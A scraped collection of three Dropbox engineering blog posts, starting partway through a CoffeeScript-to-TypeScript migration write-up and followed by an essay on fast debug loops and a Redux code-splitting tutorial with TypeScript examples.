Gaining confidence in our tools Towards the later stages of writing our tools, we became more concerned about how we could safely deploy the converted code. Just ensuring that our converted code typechecked would not be enough, especially given how many any s we were automatically adding. So we started running all of our unit tests against our code before and after it went through our pipeline. This uncovered more bugs, mostly with things that were silently buggy CoffeeScript being translated to code that would throw in TypeScript. Whenever we found one of those bugs, we would search the whole codebase for similar patterns to fix. If that was impractical, we would add an assert to our conversion tools so they would fail quickly if they encountered suspicious code. An aside on an interesting bug One of the more interesting bugs we ran into was accidentally overwriting exported functions. CoffeeScript is different from most languages in that it doesn't have a notion of variable shadowing. For example in Javascript, if you ran this: Copy let myVar = \"top-level\";\r\nfunction testMyVar() {\r\n  let myVar = \"shadowed\";\r\n  console.log(myVar);\r\n}\r\n\r\ntestMyVar();\r\nconsole.log(myVar); It would print out: Copy shadowed\r\ntop-level The myVar that's created in testMyVar is different from the top-level myVar , even though they share the same name. This isn't possible in CoffeeScript, however. The equivalent code would look like this: Copy myVar = \"top-level\"\r\ntestMyVar ->\r\n  myVar = \"shadowed\"\r\n  console.log(myVar)\r\n    \r\ntestMyVar()\r\nconsole.log(myVar) but it would print out: Copy shadowed\r\nshadowed We found an instance of that in our code that looked like this: Copy define(() ->\r\n  sortedEntries = (...) ->\r\n    ...\r\n    sortedEntries = entries.sortBy(getSortKey, cmpSortKey)\r\n    ...\r\n\r\n  return {\r\n    sortedEntries\r\n  } sortedEntries was declared as a function, but its own function body gets overwritten as an array of entries. This would make any calls to sortedEntries inside of the module fail after the first time they're called, but we never caught this issue because the sortedEntries function gets exported as a copy. That code would get translated to this: Copy let sortedEntries = function() {\r\n  ...\r\n  sortedEntries = entries.sortBy(getSortKey, cmpSortKey)\r\n}\r\n\r\nexport { sortedEntries }; Because the TypeScript code uses ES6 modules instead of AMD modules, sortedEntries is exported as a reference, not a copy. That means when another module imports sortedEntries and calls it, sortedEntries becomes an array and any subsequent calls to it will be invalid. After getting bitten by that error once, we added an assert to the translation code to bail out if they find that exported functions are re-assigned. De-risking the conversion from sloppy to strict mode Midway through building these tools, we realized that a side effect of converting from AMD to ES6 modules was that we’d be turning on strict mode for the vast majority of our code for the first time ever. Initially, this sounded scary; so we read through the MDN docs on strict mode and made a checklist of the behavior changes we could expect. Then went through the list one by one and figured out how to mitigate them. For the majority of the changes, we found that the TypeScript parser or typechecker was going to handle them for us—TypeScript had no problem complaining about new syntax errors, usage of newly reserved identifiers, or catching dumb things like reassigning eval or arguments . Some were trivially verifiable with our code search tools, for example octal literals (e.g. 043 ), with statements, or delete s of plain names. A few strict mode changes we realized were non-issues because CoffeeScript actually didn’t use the problematic construct in its code generation.  For instance, we didn’t have to worry about nested function statements (function x(){…;function y(){…}) , because CoffeeScript only ever declares anonymous functions as expressions, and assigns them to variables to give them names; and we didn’t have to worry about forgetting var and ending up with an accidental global variable, as CoffeeScript would implicitly declare the variable for us. We also learned there were changes to eval , .caller , and .callee ; however we were able to grep our codebase for these. Fortunately, we had very few usages of eval in our codebase, none of which were in CoffeeScript; and no usage of .caller and .callee, so we didn’t have to worry about these. This left us with the last category: the changes we could only verify by running the code. Of these, eval -related changes were a non-concern, and arguments usage was sparse enough that it was easy to read the code and be reasonably confident it would work. This left only 3 behavioral changes we had to worry about: Assignments to non-writable properties, getter-only properties, and properties on non-extensible objects, that used to silently fail, would now throw •    Writing to a property to an object frozen by Object.freeze was the most likely form of this we could encounter Deleting undeletable properties would now throw Changes to the behavior of this —no more boxing, and no more implicit this=window behavior. We couldn’t realistically know ahead of time if these three changes would be problematic, however this was far more manageable of a risk than the original laundry-list of strict mode changes. It’s also worth mentioning that the oldest part of our codebase, where we were most concerned that non-strict mode behavior could be necessary for the code to work, was the part which was written as non-modular code from before our introduction of AMD and RequireJS. We realized that we could convert this code to TypeScript without turning it into ES6 modules; and that by doing so it would be able to stay in sloppy mode. While this meant we essentially got no cross-module typechecking in that code, we decided this was an acceptable tradeoff for the reduction in risk to the rest of the migration. The first converted features We started the mass conversions first with our Jasmine test suite (we later migrated to Jest); this let us help ensure that later migrations were not changing tests and code at the same time, giving us higher confidence we weren’t introducing silent breakages.  After converting our Jasmine tests, we then looked for a candidate for the first conversion of production code. At Dropbox, we have a culture of doing bug bashes before a feature release, where QA and a bunch of engineers for the team get in the room and try to manually find bugs with the feature. After talking to QA and a bunch of teams, we decided to target converting internal tools and the comments UI on our shared link pages first. For the comments UI, we bug bashed on this with the team who owned it. While we stumbled over several bugs during the bash, we were able to verify that none of the bugs were due to the conversion to TypeScript, so got the green light to ship this conversion. A side note: it was really easy to determine if a bug was caused by our change or not because of recent investment in adopting Bazel both as our build tool, and as the basis of our development and integration testing framework. As a result of using Bazel and our own itest tooling for services, we could simply check out the previous revision and run itest on it. This would rebuild and start a copy of our dev services at that exact version of code, which made it very easy to see if a bug was introduced by our changes or not. Dropbox engineer Benjamin Peterson talked about how itest works in his bazelcon 2017 talk about Integration Testing . We proceeded from here with converting our internal crash reporting, feature gating, and email sending tools, followed by starting the conversion of the rest of the user-facing codebase in large batches. The value of rigor We learned that when writing code translators, you have to be rigorous, covering every corner case. Being explicit about which ones you don’t cover is very important, because any case you miss is likely to bite you. If you’re writing your own conversion tool here are some tips: Whenever you add a transformation for a node type, make sure you look in the docs for all the cases you need to cover If you think a certain node type is unlikely to show up and isn't worth covering, throw an error so you aren't surprised if it actually shows up in your code. We relied heavily on the ES T ree S pec and the ts-estree source code for this Any time you uncover a bug, search your codebase to find other instances of that pattern of bug and fix them. Otherwise, you'll be stuck playing whack-a-mole with similar bugs in production. The tail end The last few weeks of the project we spent converting about 100-200 files at a time; this batch size was practical only because we had polished our tooling to the point that such conversions were doable in several hours of engineering time. This meant we could go from start to integrated on our master branch within a day or two, keeping rebasing pains to a minimum. Most of the time in these diffs was spent getting typecheck satisfied with our code, as we had fixed most issues with Jasmine and Selenium tests during our up front verification work. One of the tricks we used to iterate faster was running tsc --noEmit --watch on our code base, so that we could get incremental typecheck results in about 10 seconds instead of the minute it required to typecheck from scratch. We were able to achieve this speed in part because we made the jump from TypeScript 2.5 to TypeScript 2.6 during this migration, which crucially included major improvements to --watch speed. To stay focused, we also kept a count of the remaining CoffeeScript files on a whiteboard in our team’s area, and replaced this number each time our code was merged into the master branch. This helped remind us of how far we had come, and keep the end goal of zero CoffeeScript in sight. After we finally converted the last CoffeeScript, we celebrated its sunset by drinking coffee with our internal customers in the Dropbox café, Little R. Only two bugs We set out from the beginning knowing that if we caused too many bugs, the whole project would end up derailed. In the end, I only recall two bugs that slipped into production; most potential bugs were introduced while manually fixing typecheck errors, and despite our test coverage not being great, did not get past our combination of automated Jasmine and Selenium tests. The majority of teams thus didn’t notice anything other than that their code was now TypeScript, and they had to rebase a few in-progress diffs. While the rebases were painful for some people, they were rather happy to be working in TypeScript afterwards, so we didn’t get any large complaints about this. We converted the code of the most vocal concerned teams last. When we got to the point we wanted to convert their code, it helped a lot to be able to say “well, we already converted over 150,000 lines of CoffeeScript, and haven’t had a bug yet in production.” One team really was not sold by this argument though, so we clarified that if we caused a major bug for them, they could wake us in the middle of the night to fix it, if they gave us steps to reproduce it; and we promised to investigate less serious bugs within a business day, and fix them if they were our fault. We made this promise because we were confident in our conversion scripts and willing to stand behind them. In the end, they did not need to wake us for a bug fix, and the only bug we caused for them, we noticed in our exception reporting and fixed before they came to work the next day. The majority of bugs initially attributed to our conversion, we were able to show were from other sources—either by showing the bug did not reproduce on the revision of our change, or by showing the bug reproduced on the directly prior revision. Two cases we recall: A team filed a bug in the web file browser page due to our migration; it turned out this was actually introduced by them doing post-conversion cleanup on their own code to make it more idiomatic and better typed TypeScript. In another case, a bug in our admin console two factor auth UI was caused by a rewrite of our account page’s two factor auth UI. The two pages shared the code, but the code was not clearly marked as shared, nor was the integration on the admin console tested, so the rewrite did not consider the admin console use case and broke it as a result. Reflecting In the end, the auto-migration process took just about two months, with three engineers working on it and about 19 engineer-weeks spent; significantly better than the original 10 engineer-year estimate. Granted, the output was not idiomatic TypeScript, as most people had originally aimed for, but rather some very messy, any -laden TypeScript. This trade-off was worth it. It let us rid of CoffeeScript much sooner, so that we neither needed to keep supporting CoffeeScript, nor did new hires need to learn the language to ship product code for our website. This has enabled us to use TypeScript everywhere, while making incremental improvements to our code style and type safety when it is useful. While we learned plenty of technical lessons throughout this process, possibly the most important lesson our team learned was that we should save our political and organizational capital for jobs we can’t automate for everyone. While no one particularly liked maintaining CoffeeScript—and some teams may have converted code to TypeScript on their own accord—making the rest of engineering manually convert all their CoffeeScript in the span of under a year was never going to fly. In hindsight, we’re better off automating repetitive tasks where possible, and only making such large asks when it really does require knowledge specific to the code in question and can’t be solved by automation. Special thanks First of all, thanks to Samer Masterson and Nicklas Gummesson for powering through the auto-migration effort; Lennart Jannson, Christoffer Klang and Gloria Chou for earlier efforts integrating TypeScript into the codebase; Leo Franchi for quarterbacking the original research and decision to commit the team to TypeScript; Christoffer Klang and Linjie Ding for pioneering our use of decaffeinate; Stacey Sern for the very timely upgrade to Typescript 2.6 that propelled the auto-migration forward; and the countless engineers who pitched in to convert their own code to TypeScript, before the auto-migration, and who put up with waking up one day to see their treasured CoffeeScript in a totally new (and possibly foreign) language; and the decaffeinate open source project for making our complete migration possible. Today Editor’s postscript: Fast forward to 2020, we now have over two million lines of TypeScript at Dropbox. Our entire codebase is statically typed, and we have a thriving TypeScript community internally. TypeScript has allowed us to scale our engineering organization so teams can work independently while maintaining clear contracts across code. TypeScript as a language has surged in popularity, and we were lucky enough to be one of the first big companies to migrate. As a result, we’ve been fortunate to develop expertise and share it externally. Our JS Guild regularly shares TypeScript tips and tricks, and our engineers love the language they work in. One of our engineers even wrote a case study of when TypeScript isn’t a strict superset of JavaScript. There are still a handful of files with “this was migrated from coffeescript” comments, but those make up a small percentage of our codebase. Our latest code is well typed and we generally push back on any s. Most recently, we upgraded all of our codebases to TypeScript 3.8. —Matthew Gerstman // Tags Front End JavaScript TypeScript Open Source CoffeeScript // Copy link Link copied Link copied", "date": "2020-05-13"},
{"website": "Dropbox", "title": "The Programmer Mindset: Main Debug Loop", "author": ["Cseibert4164dae603"], "link": "https://dropbox.tech/frontend/the-programmer-mindset-main-debug-loop", "abstract": "The Main Debug Loop Validation Happens in Layers Optimizing Loop Time Why Fast Loops are Better Are Short Loop Times Universal? Some Integrated Testing is Necessary Does Complexity Lead to Test Validation Loops? Staging Environments to the Rescue Conclusion Validating ONLY with tests is basically flying the plane on instrumentation, versus being able to look out the windshield. Flying visually and by muscle-memory is both more efficient and safer, in conjunction with instrumentation. You’re much less likely to hit a mountain by mistake. When you’ve been coding for more than twenty years, it can be difficult to recapture beginner’s mind , and explain how to think like a programmer to someone who is new to it. I remember an incident in college, when I had been coding for a comparatively short time, that crystalized in my mind the thought process behind writing code—what you might call the programmer philosophy. I was helping a friend complete a Computer Science 101 assignment. They were completely new to coding. They had written an entire solution, on paper, beginning to end—maybe 100 lines of code. THEN they typed it all in to a text editor, and ran it. What do you think happened? They got about a thousand syntax errors. This is when they came to me, feeling like they had hit a brick wall. I had been sitting beside them in the same class—but critically, I had been coding for a while already. I had already internalized the basic thought process of writing code, without ever having to articulate it. Our professor had failed to impart that thought process. The Main Debug Loop What I had to then explain to my friend is the thought process that I’m now going to call the “Main Debug Loop.” I believe that this is a natural mindset that develops in all programmers—assuming they successfully learn to code. It involves breaking down the problem into very small pieces. Small enough such that you’re writing 1-3 lines of code at a time. Every time you write one of these small chunks, you run the program. Usually it doesn’t work, and you try again. Slowly, you accrete code that you’ve convinced yourself works. You build up the whole solution iteratively. The keys are two fold: you’re building incrementally, and you’re validating as you go. As you gain experience, you work on more and more complex systems. But this mindset scales to problems of any complexity—you just have to break them down more. This is the main debug loop. Write code, run code. Running the code is the validation. Validation Happens in Layers What exactly is validation? Here is an example of what I’ll call in-application validation. In web development, you write a few lines of code, save the file, and refresh you browser. Then, you interact with the page/application manually to see if what you just changed works. For speed, you’re probably only testing the happy path, or the one edge case that you’re currently implementing. For any other kind of development, the process in analogous, but the specifics look different. Test validation does not happen in the application. Instead, you run a small set of synthetic assertions against the code you’ve just written. This is a best-practice called test-driven development . TDD is used in conjunction with in-application validation. In practice (and contrary to strict TDD), my observation has been that developers work in short loops, validating in-application, and then quickly fast-follow with unit-test coverage. Another layer of validation is automated integration testing, using either a tool like Selenium for application layer validation, or Postman for API layer validation. You may also have exhaustive manual testing, potentially by dedicated QA engineers. Finally, you can use feature gating to validate in production. All of these layers of validation work on concert to ensure quality. When you’re writing the code iteratively, you typically utilize in-application validation and/or or test validation, because they are so much faster. Optimizing Loop Time The main debug loop can be something that you execute hundreds of times an hour. Thinking and typing code are the natural bottlenecks—you’re a lot slower than the computer, after all. In an ideal world, running the code to validate what you just wrote is instantaneous. For the vast majority of my coding career, running small chunks of code averaged maybe 5 seconds. The overhead is due to latency in the file system registering that files have been updated, the runtime loading the change, and your own “human time”—interacting with the newly updated application to run the change and see the results. The computer’s portion of the loop time is variable based on the language, the framework, and the application itself. Scripting languages don’t have to be compiled before they are run. Some types of coding naturally involve more or less human interaction. For example, running a console command tends to involve less human latency than refreshing a web app. But because the main debug loop time is so universally critical to the developer workflow, the language and framework authors have a large incentive to optimize it. The developers likewise are incentivized to optimize their own application for it. Why Fast Loops are Better To my mind, slow loop time recalls some of the worst debugging nightmares of my career, what I call “flying blind.” The worst cases have two properties: they are not reliably reproducible, and each attempt at reproduction takes a long time. For debugging, non-reproducibility by itself can lead to unacceptably slow loop time. If you have a deploy to production to see if it worked, or you have to run the code many times to see if it fails once, that’s a worst case slow loop time scenario. It’s easy to see how this extreme scenario can lead to slow development, and low quality output. In contrast, some of my most positive memories of being “in the flow” invoke the sensation of being in constant, fluid dialog with the computer. Like a back-and-forth conversation, you’re arriving at your conclusion collaboratively. You’re validating the code nearly as fast as you can think it and type it. For me, even a 10 second latency in being able to run and validate a change can break that flow. Still, the assertion that shorter loops times are better rests on an unprovable assumption—that running more cycles for a given scope of work will result in higher output per time period, and/or higher quality. I believe this is true, but I concede that (no matter how personally counter-intuitive) it’s possible that over-all throughput and quality could be as high or higher with slow loop times. Are Short Loop Times Universal? Loop times are not guaranteed to be short—in fact, technical entropy will exert constant pressure to increase loop times. Significant developer time needs to be expended to make sure that the test suite continues to run quickly, the application reloads code quickly, and that the UX itself (on user facing applications) affords developers the ability to quickly reload and validate. Given that brand-new projects tend to inherit short loop time on small codebases from their parent language and framework, it’s no surprise that in my career-to-date at small startups, we tended to have short loop time. We had to expend effort to keep them short, but we were generally able to do so. However, I have seen that in larger code bases, with larger teams, short loop time is not a given. Perhaps it is too costly to maintain short loop time as the complexity scales? What ever the cause, once the loop time hits the point of breaking flow, developers will naturally seek shorter loops, such as switching to test validation. In an extreme case, you may not validate in-application at all, and trust that your test are validating correctness. To me, the retreat to test validation seems super dangerous—but the developers will do what they need to do to keep loop times short, even if they are not validating fully. Some Integrated Testing is Necessary Without running code in a fully integrated environment at some point before shipping it, you’re running a greatly elevated risk of shipping bugs. This could look like validating in-application as you write the code, exhaustive manual testing or gated validation in production. Validating only in a synthetic scenario simply does not afford the same confidence as running everything integrated together. How many times have separately developed components not worked properly once they are eventually integrated? This happens even if the interfaces match perfectly—the composed behavior is very often still wrong. No QA person on the planet would condone shipping something to production without running it the same way a user will experience it—integrated together. Validating ONLY with tests is basically flying the plane on instrumentation, versus being able to look out the windshield. Flying visually and by muscle-memory is both more efficient and safer, in conjunction with instrumentation. You’re much less likely to hit a mountain by mistake. Does Complexity Lead to Test Validation Loops? Keeping loop time short is hard when you have complex systems, and large codebases. Hot reloading may very well take longer than 10 seconds by itself, in order to load and recompile a large codebase. Scripting languages have an advantage here, but have their own non-orthogonal costs. Even scripting languages may have unacceptable latency if the framework requires transpiling. Service oriented architecture presents unique advantages and challenges for the main debug loop. On one hand, you are working on an individual, smaller codebase most of the time. Hot reload times are shorter. On the other hand, running your application composed with services and external data-stores gets both very complicated and also takes a ton of compute resources. Before long, running it locally is not even possible. In practice, I have noticed a correlation between large codebases, service architecture, and a retreat to test validation as the primary debug loop. Staging Environments to the Rescue A staging environment is like a miniature version of production. It should have all the same services set up, as well as the same basic network architecture. It’s just scaled down significantly. Typically it has the exact same data-stores and schema, but totally different data-sets. Staging is totally isolated from production; you can’t talk to production versions of any services, and you can’t talk to production data-stores. Depending on the sensitivity of the product domain, you may be able to sync production data down to staging, either in whole or sanitized. In many domains, that is not possible from a security perspective, so you create fake test data, with the entire engineering team using the same test data-sets and data-stores. You begin to have your “favorite” test users and records, and can bring them up in-application quickly. Staging environments have a lot of uses—but how can they help keep developers in the in-application validation flow? Intelligent service routing can help solve the local machine resource problem, AND alleviate the burden of maintaining a local data set. The downside is that it requires that developers have an active internet connection to staging. The premise is that you hook your development service up to staging, and route your individual in-application validation requests through the normal staging service graph—EXCEPT for one or two services that you’re currently developing. The staging network topology will pieces of the service call graph from the staging environment in the cloud back to your development box, likely over a VPN. It sounds really complicated, but this dynamic routing is a standard feature of service aware routing mesh frameworks like linkerd . Conclusion The switch from in-application validation to test validation in the primary debug loop lead to lower quality, slower velocity, and to context switching. System entropy towards test validation takes a LOT of work to counter. Maintaining short debug loops quickly becomes a full time job for someone, or a team of someones. But, even with as few as 50 engineers, organizations I’ve been in have opted to pay that cost. It’s possible (though I’m not yet convinced) that the cost grows exponentially as you scale up in terms of people and codebase size. In that case, I would expect companies at large scale to near-universally live with slow debug cycles and the primacy of test validation. View original post on Chase Seibert’s blog. // Tags Front End Frontend Leadership Productivity // Copy link Link copied Link copied", "date": "2019-07-02"},
{"website": "Dropbox", "title": "Redux with Code-Splitting and Type Checking", "author": ["Matthew Gerstman"], "link": "https://dropbox.tech/frontend/redux-with-code-splitting-and-type-checking", "abstract": "Before We Get Started Introduction The Architecture Creating the Store Type Safety Selectors Writing Actual Product Code Conclusions Glossary of Functions Before We Get Started This article assumes a working knowledge of Redux, React, React-Redux, TypeScript, and uses a little bit of Lodash for convenience. If you’re not familiar with those subjects, you might need to do some Googling. You can find the final version of all the code here . Introduction Redux has become the go-to state management system for React applications. While plenty of material exists about Redux best practices in Single Page Applications (SPAs), there isn’t a lot of material on putting together a store for a large, monolithic application. What happens when you only need a few reducers on each page, but it could be any permutation of the total number of reducers you support? How do you code-split your store so you’re not serving unnecessary JavaScript on a single page? And while you’re working on code splitting, how do you get it to play nicely with TypeScript so that you can trust what’s going in and coming out of the store? The Architecture Before we dive into code, let’s outline the architecture we’re about to build. We need to create the store in such a way that we can register reducers asynchronously. This allows us to async load code associated with those reducers. We need to type the store in such a way that it knows about all possible reducers we can register. This allows us to ensure static typing of all components at runtime. Creating the Store In order to code split, we need to instantiate the store in a way that allows us to register reducers after store creation. We start with the following code: Copy // redux-utils/store.ts\n\nimport { combineReducers, createStore, Store } from \"redux\";\nimport { ReducerMap, StoreShape } from \"./types\";\n\nlet reducerMap: ReducerMap = {};\nconst store = createStore(combineReducers(reducerMap));\n\nexport function getStore() {\n  return store;\n}\n\nexport function registerReducer(newReducers: ReducerMap): Store {\n  reducerMap = { ...reducerMap, ...newReducers };\n  // We probably want to validate we're not replacing reducers that already\n  // exist here but that exercise is left up to the reader.\n  store.replaceReducer(combineReducers(reducerMap));\n  return store;\n} What’s going on here? We’re instantiating the store with the file and we’ve also exported two functions. One called getStore , which is simply a wrapper around the store and doesn’t need much further explanation, and registerReducer . registerReducer is the more interesting function. We maintain a map of existing reducers internal to the module and then replace add new ones as they come in. We then call replaceReducer on the store and replace it wholesale. replaceReducer is smart enough to maintain the state of the reducers that were previously there and fires an INIT action for the new ones to populate their default state. This is what makes code-splitting possible. We don’t care when the reducer is registered and all of that code can be loaded after the store is created. Type Safety Now let’s dig into what makes this type safe. Well, let’s dig into our types.ts file. Copy // redux-utils/types.ts\r\n\r\nimport { NonwizardNamespaceShape } from \"../data/nonwizard/types\";\r\nimport { WizardNamespaceShape } from \"../data/wizards/types\";\r\nimport { Reducer } from \"redux\";\r\nexport const NONWIZARD_NAMESPACE_KEY = \"NONWIZARD_NAMESPACE\";\r\nexport const WIZARD_NAMESPACE_KEY = \"WIZARD_NAMESPACE\";\r\n\r\nexport type FullStoreShape = {\r\n  [NONWIZARD_NAMESPACE_KEY]: NonwizardNamespaceShape;\r\n  [WIZARD_NAMESPACE_KEY]: WizardNamespaceShape;\r\n};\r\nexport type StoreShape = Partial<FullStoreShape>;\r\nexport type NamespaceKey = keyof StoreShape;\r\nexport type ReducerMap = Partial<\r\n  {[k in NamespaceKey]: Reducer<FullStoreShape[k]>}\r\n>; You’ll notice we import NonwizardNamespaceShape and WizardNamespaceShape from elsewhere in the codebase. This is okay. Because these are type-only imports, most build systems won’t actually bundle them in when building packages. This is where the statically typed code splitting magic happens. We then export types StoreShape and ReducerMap , which allow us to register all possible types on the actual state object in advance. Because we colocate the namespace keys in the types file, our developers can ensure that there are no key conflicts. You’ll notice these types are both Partial , so how do we enforce that a reducer is actually registered? Well, we do that in the selector layer. Selectors Our selector layer is what ensures that we always have the reducers registered that we need. We can do this with a simple helper function. Copy // redux-utils/selectors.ts\n\nimport { FullStoreShape, NamespaceKey, StoreShape } from \"./types\";\nexport function getStateAtNamespaceKey(\n  state: StoreShape,\n  namespace: T\n): FullStoreShape[T] {\n  const namespaceState = state[namespace];\n  if (!namespaceState) {\n    throw new Error(\n      `Attempted to access state for an unregistered namespace at key ${namespace}`\n    );\n  }\n  // We need to explicitly say this is not undefined because TypeScript doesn't \n  // recognize the thrown error will prevent us from ever getting here.\n  return namespaceState!;\n} In short, getStateAtNamespaceKey complains very loudly if you attempt to access a namespace that hasn’t been registered yet. This is the only way we should access our data. As long as you call registerReducer in the same part of your tree as your <Provider /> component, your namespace should be registered by the time you get down to a connect . We’ll elaborate on this in a moment. Writing Actual Product Code This is is all well and good, but let’s talk about what our product code looks like. Copy //wizards.tsx\r\n\r\nimport * as React from \"react\";\r\nimport { connect, Provider } from \"react-redux\";\r\nimport { getStoreForWizardApp } from \"./data/wizards/store\";\r\nimport { Wizard } from \"./data/wizards/types\";\r\nimport { getWizards } from \"./data/wizards/selectors\";\r\nexport function WizardApp() {\r\n  return (\r\n    <Provider store={getStoreForWizardApp()}>\r\n      <ConnectedWizards />\r\n    </Provider>\r\n  );\r\n}\r\nfunction Wizard({ name, spells, hasWand }: Wizard) {\r\n  return (\r\n    <>\r\n      <span>Name: {name}</span>\r\n      <span>Parents: {parentsAlive ? \"Alive\" : \"Dead\"}</span>\r\n      <span>Learned Spells: {spells.map(spell => `${spell} `)}</span>\r\n    </>\r\n  );\r\n}\r\ntype WizardsProps = { wizards: Wizard[] };\r\nfunction Wizards({ wizards }: WizardsProps) {\r\n  return (\r\n    <>\r\n      {wizards.map(wizardProps => (\r\n        <Wizard {...wizardProps} />\r\n      ))}\r\n    </>\r\n  );\r\n}\r\nconst mapStateToProps = state => ({\r\n  wizards: getWizards(state)\r\n});\r\nconst ConnectedWizards = connect(mapStateToProps)(\r\n  Wizards\r\n); The code above is (hopefully) straightforward. We connect to the Redux store using react-redux and use the <Provider / > and connect component/HOC respectively. We take a list of wizards and render them out to the screen, along with information about what spells they know and the status of their parents. Spoiler: We’re getting to a certain boy wizard with a lightning scar. The two novel bits of code here are getStoreForWizardApp and getWizards . Let’s dig into them both. getStoreForWizardApp Copy // data/wizards/store.ts\n\nimport { getStore, registerReducer } from \"../../redux-utils/store\";\nimport { WIZARD_NAMESPACE_KEY } from \"../../redux-utils/types\";\nimport { once } from \"lodash\";\nimport wizardReducer from \"./reducer\";\nexport const getStoreForWizardApp = once(() =&gt; {\n  registerReducer({ [WIZARD_NAMESPACE_KEY]: wizardReducer });\n  return getStore();\n}); In the above code, you saw what we call the registerReducer and getStore functions that we declared before. We pass registerReducer a map with the key for the Wizard namespace and the Wizard reducer. Another important note: if we try to pass the wrong key or even the wrong reducer to registerReducer , type checking will complain about it. One last but crucial bit. We wrap getStoreForWizardApp in lodash.once . This ensures that we only register the reducer once and then always return the same instance of the store. While this isn’t strictly required, replaceReducer is an expensive noop, if called repeatedly. getWizards Copy // data/wizards/selectors.ts\n\nimport { getStateAtNamespaceKey } from \"../../redux-utils/selectors\";\nimport { StoreShape, WIZARD_NAMESPACE_KEY } from \"../../redux-utils/types\";\nimport { mapValues } from \"lodash\";\nimport { Wizard } from \"./types\";\n\nconst getWizards = (state: StoreShape) =&gt; (\n  getStateAtNamespaceKey(state, WIZARD_NAMESPACE_KEY)\n); This one is much more straightforward. We call getStateAtNamespaceKey and spit out the wizards to the user. Actions Sweet! We’ve set up the store, registered our reducer, and even built some components. Now let’s talk about how we can strongly type our actions. We do this in both the action layer and the reducer layer. Copy // data/wizards/actions.ts\n\nimport { AnyAction } from \"redux\";\nexport type Wizard = {\n  name: string;\n  hasWand: boolean;\n  spells: string[];\n};\nexport const enum WizardActionTypes {\n  LearnSpell = \"WIZARD/LEARN_SPELL\",\n  BreakWand = \"WIZARD/BREAK_WAND\"\n}\nexport type WizardNamespaceShape = {\n  [id: string]: Wizard;\n};\nexport interface LearnSpellAction extends AnyAction {\n  type: WizardActionTypes.LearnSpell;\n  payload: { id: string; spell: string };\n}\nexport interface BreakWandAction extends AnyAction {\n  type: WizardActionTypes.BreakWand;\n  payload: { id: string };\n}\nexport type WizardAction = LearnSpellAction | BreakWandAction; You’ll notice that we have two action types: LearnSpellAction and BreakWandAction . These actions each have a strongly-typed payload and their type is a predetermined string enum. We also export WizardAction , which is useful in our reducer. Copy // data/wizards/reducer.ts\n\nimport { WizardAction, WizardActionTypes, WizardNamespaceShape } from \"./types\";\nconst defaultState: WizardNamespaceShape = {\n  powerfulWizard: {\n    name: \"Powerful Wizard\",\n    hasWand: false,\n    spells: []\n  }\n};\nexport default function reducer(\n  state: WizardNamespaceShape,\n  action: WizardAction\n) {\n  switch (action.type) {\n    case WizardActionTypes.breakWand: {\n      const { id } = action.payload;\n      return {\n        ...state,\n        [id]: {\n          ...state[id],\n          hasWand: false\n        }\n      };\n    }\n    case WizardActionTypes.LearnSpell: {\n      const { id, spell } = action.payload;\n      return {\n        ...state,\n        [id]: {\n          ...state[id],\n          spells: [...state[id].spells, spell]\n        }\n      };\n    }\n    default: {\n      return state;\n    }\n  }\n} This is one of those occasions where TypeScript is truly brilliant. Our given action type is any of the WizardActionTypes . Because each of them has their own defined type property, our switch statement will actually strongly type action.payload after we determine its type. If we were to put any invalid code here, TypeScript would complain. Store Hydration The last question to answer here is: “How do we get initial data into the store?” That’s done through a process called store hydration. What this means is that we’re going to dispatch an action that sets the state. Let’s take a look at this code. First, we update our actions.ts file as shown. Copy export const enum WizardActionTypes {\n  Hydrate = \"WIZARD/HYDRATE\",\n  LearnSpell = \"WIZARD/LEARN_SPELL\",\n  BreakWand = \"WIZARD/BREAK_WAND\"\n}\n\nexport interface HydrateWizardsAction extends AnyAction {\n  type: WizardActionTypes.Hydrate;\n  payload: WizardNamespaceShape;\n}\nexport type WizardAction =\n  | HydrateWizardsAction\n  | LearnSpellAction\n  | BreakWandAction; Second, we add another switch statement to our reducer. Copy switch (action.type) {\n  case WizardActionTypes.Hydrate: {\n    return {\n      ...action.payload\n    };\n  }\n  case WizardActionTypes.BreakWand: { Third, we need to make an action creator. Copy // data/wizards/actions.ts\n\nimport { WizardActionTypes, WizardNamespaceShape } from \"./types\";\n\nexport function hydrateWizardNamespace(initialData: WizardNamespaceShape) {\n  return {\n    type: WizardActionTypes.Hydrate,\n    payload: initialData\n  };\n}\n// LearnSpell and BreakWand are exercises left up to the reader Finally, we dispatch the hydration action from our store creation function. Copy import { getStore, registerReducer } from \"../../redux-utils/store\";\nimport { WIZARD_NAMESPACE_KEY } from \"../../redux-utils/types\";\nimport { once } from \"lodash\";\nimport wizardReducer from \"./reducer\";\nimport { WizardNamespaceShape } from \"./types\";\nimport { hydrateWizardNamespace } from \"./actions\";\nexport const getStoreForWizardApp = once(\n  (initialData?: WizardNamespaceShape) =&gt; {\n    registerReducer({ [WIZARD_NAMESPACE_KEY]: wizardReducer });\n    const store = getStore();\n    if (initialData) {\n      store.dispatch(hydrateWizardNamespace(initialData));\n    }\n    return store;\n  }\n); The lodash.once is now extra useful because we will only ever populate the store once. Conclusions I hope this article helped you get started with Redux. At compile time, our store is strongly typed and has knowledge of the entire system. At runtime, we can code split however we’d like. Glossary of Functions This is a list of the core functions and types and the roles they serve in this architecture. Types NamespaceKey — A key for a reducer or namespace within the state object. ReducerMap — Object of all possible keys we can have on our store and their matching reducers. Is declared as a partial because it is not guaranteed that any given namespace is on the store. StoreShape — Object of all possible keys we can have on our store and their state shapes. Is declared as a partial because it is not guaranteed that any given namespace is on the store. Functions hydrateWizardNamespace — Product layer function that provides initial state for the wizard namespace after the reducer is registered. getStoreForWizardApp — Product layer function that registers the “wizard” namespace within the store. getStateAtNamespaceKey — Function that grabs a namespace from the state object and fails quickly if that namespace is unregistered. Used to make our selectors type safe. registerReducer — Function that injects a reducer into the store after page load. Ensures that we only register known reducers at the typing layer. This post was originally posted on Matthew Gerstman’s personal blog . Links to original gists as well as a list of acknowledgements can be found there. You can follow Matthew on Twitter @MatthewGerstman. // Tags Front End Frontend // Copy link Link copied Link copied", "date": "2019-07-16"},
